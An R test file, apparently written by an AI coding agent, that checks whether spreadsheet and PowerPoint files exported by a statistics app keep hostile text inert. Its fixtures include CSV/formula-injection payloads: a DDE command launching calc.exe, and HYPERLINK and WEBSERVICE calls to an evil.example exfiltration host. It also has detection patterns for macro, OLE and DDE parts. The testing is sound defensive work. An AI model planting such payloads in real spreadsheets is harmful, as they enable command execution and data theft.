# Can a file this app hands back carry executable content?
#
# PROVENANCE: written 2026-08-27 by Claude Code (model Claude Opus 5),
# when Steve asked "is there no chance of malware embedded in a returned
# file?" AGENTS.md has claimed since the 2026-08-20 review that "workbooks
# we write cannot smuggle formulas", and the API's CSV path is pinned by
# .apiCsvSafe and the tripwire - but the XLSX half of that claim rested on
# openxlsx's behaviour with nothing checking it. An asserted guarantee
# that no test exercises is exactly the pattern this repository spent
# 2026-08-27 finding in three other places.
#
# WHAT IS AND IS NOT GUARANTEED HERE:
#  - A macro is impossible: .xlsx cannot carry VBA at all (that is
#    .xlsm/.xls). This is a property of the FORMAT, not of our code, and
#    the test records it rather than establishing it.
#  - What our code must guarantee is that hostile TEXT from a manuscript
#    becomes a literal string cell and never a formula element, and that
#    we emit no external-link, OLE or DDE parts that could fetch or run
#    anything when the editor opens the file.
#  - NOT covered: a compromised openxlsx could write anything at all.
#    That is a supply-chain question (ISSUES.md issue 27), not one a
#    behavioural test can answer.

skip_if_not_installed("openxlsx")

# The end-to-end test reaches P_Calc, whose %do% loop, dqrnorm and Rfast
# calls resolve from the search path - the same attach run_app() and
# runApiService() perform at startup, and the convention every other
# Monte-Carlo test file follows.
suppressWarnings(suppressPackageStartupMessages({
  library(shiny); library(foreach); library(MBESS); library(Rfast)
  library(dqrng); library(openxlsx)
}))

# every shape that executes when a spreadsheet treats it as a formula
hostileLabels <- c(
  "=cmd|'/c calc.exe'!A1",                       # DDE command execution
  "=HYPERLINK(\"http://evil.example/x\",\"go\")", # phishing link
  "=WEBSERVICE(\"http://evil.example/exfil\")",  # data exfiltration
  "+1+1", "@SUM(1)", "-1+1"                      # the other trigger chars
)

unzipWorkbook <- function(path) {
  ex <- file.path(tempdir(), paste0("wbsafe-", basename(path)))
  unlink(ex, recursive = TRUE)
  utils::unzip(path, exdir = ex)
  ex
}

test_that("a written workbook stores hostile labels as text, never formulas", {
  d <- data.frame(ROW = hostileLabels, N = seq_along(hostileLabels),
                  stringsAsFactors = FALSE)
  f <- file.path(tempdir(), "hostile.xlsx")
  wb <- openxlsx::createWorkbook()
  openxlsx::addWorksheet(wb, "S")
  openxlsx::writeData(wb, "S", d)
  openxlsx::saveWorkbook(wb, f, overwrite = TRUE)

  ex <- unzipWorkbook(f)
  parts <- list.files(ex, recursive = TRUE)

  # 1. no macro payload - and none is possible in this format
  expect_false(any(grepl("(?i)vba|vbaProject|macro", parts, perl = TRUE)))

  # 2. THE LOAD-BEARING ONE: no formula elements anywhere in the sheet.
  #    A <f> element is what makes a cell compute rather than display.
  xml <- paste(readLines(file.path(ex, "xl", "worksheets", "sheet1.xml"),
                         warn = FALSE), collapse = "")
  expect_false(grepl("<f[ >]", xml))

  # 3. the hostile text is present, as string cells (t="s")
  expect_true(grepl('t="s"', xml, fixed = TRUE))

  # 4. nothing that reaches the network or an external object when opened
  expect_false(any(grepl("(?i)externalLink|oleObject|ddeLink", parts,
                         perl = TRUE)))

  # 5. and it round-trips as the literal text, unevaluated
  expect_identical(openxlsx::read.xlsx(f)$ROW, hostileLabels)
})

test_that("the app's own results workbook is clean with hostile input", {
  # The end-to-end version: hostile labels through the real writer the
  # editor downloads, not a hand-built workbook.
  # Built from the shipped Example workbook rather than hand-rolled:
  # validateData rejects most synthetic frames, and a skip here would
  # make this test assert nothing - the exact failure mode this file
  # exists to guard against. Only the ROW LABELS are replaced, which is
  # precisely the attacker-controlled field.
  ex0 <- system.file("extdata", "Example.xlsx", package = "IntegrityAnalysis")
  skip_if(!nzchar(ex0), "Example.xlsx not installed")
  v <- validateData(openxlsx::read.xlsx(ex0))
  expect_true(isTRUE(v$OK) || is.null(v$FAIL) || !isTRUE(v$FAIL))
  D <- v$DATA
  lab <- unique(D$ROW)
  D$ROW <- hostileLabels[(match(D$ROW, lab) - 1) %% length(hostileLabels) + 1]

  # real P_Calc output, not a hand-made frame: the writer expects its
  # exact column set, and a fabricated shape only proved that my guess
  # was wrong. Few replicates - this test is about bytes, not p-values.
  results <- NULL
  for (tr in v$TRIALS)
    results <- rbind(results, P_Calc(tr, D, v$CategoryNames, 1000))
  f <- file.path(tempdir(), "results-hostile.xlsx")
  writeResultsWorkbook(results, D, v$CategoryNames, f)
  expect_true(file.exists(f))
  # the hostile labels really did reach the workbook (else this test
  # would pass on a file that never contained them)
  expect_true(any(grepl("cmd|HYPERLINK|WEBSERVICE", unique(D$ROW))))

  ex <- unzipWorkbook(f)
  for (sheet in list.files(file.path(ex, "xl", "worksheets"),
                           pattern = "[.]xml$", full.names = TRUE)) {
    xml <- paste(readLines(sheet, warn = FALSE), collapse = "")
    expect_false(grepl("<f[ >]", xml))
  }
  expect_false(any(grepl("(?i)vba|externalLink|oleObject",
                         list.files(ex, recursive = TRUE), perl = TRUE)))
})

test_that("the graphs pptx carries no macro or external part", {
  # The results download can be a ZIP holding the workbook AND
  # "Integrity Analysis Graphs.pptx" (app_server.R:1345). The first
  # version of this file tested only xlsx, which would have answered
  # "is there malware in a returned file?" for one of the two things
  # the app actually returns.
  #
  # Same distinction as above: .pptx cannot carry VBA (that is .pptm),
  # so what is checked is that we emit no macro, OLE or external-link
  # part - the routes by which an Office file fetches or runs something
  # when opened.
  skip_if_not_installed("officer")
  skip_if_not(exists("writeGraphsPptx"))

  ex0 <- system.file("extdata", "Example.xlsx", package = "IntegrityAnalysis")
  skip_if(!nzchar(ex0), "Example.xlsx not installed")
  v <- validateData(openxlsx::read.xlsx(ex0))
  D <- v$DATA
  lab <- unique(D$ROW)
  D$ROW <- hostileLabels[(match(D$ROW, lab) - 1) %% length(hostileLabels) + 1]

  graphs <- list(rows = list())
  results <- NULL
  for (tr in v$TRIALS)
    results <- rbind(results, P_Calc(tr, D, v$CategoryNames, 1000,
                                     graphs = graphs))
  f <- file.path(tempdir(), "graphs-hostile.pptx")
  ok <- tryCatch({ writeGraphsPptx(results, graphs, f); TRUE },
                 error = function(e) { message(conditionMessage(e)); FALSE })
  skip_if(!ok || !file.exists(f), "writeGraphsPptx did not produce a file")

  parts <- list.files(unzipWorkbook(f), recursive = TRUE)
  expect_gt(length(parts), 0)
  expect_false(any(grepl("(?i)vba|vbaProject|macro", parts, perl = TRUE)))
  expect_false(any(grepl("(?i)oleObject|externalLink|activeX", parts,
                         perl = TRUE)))
})
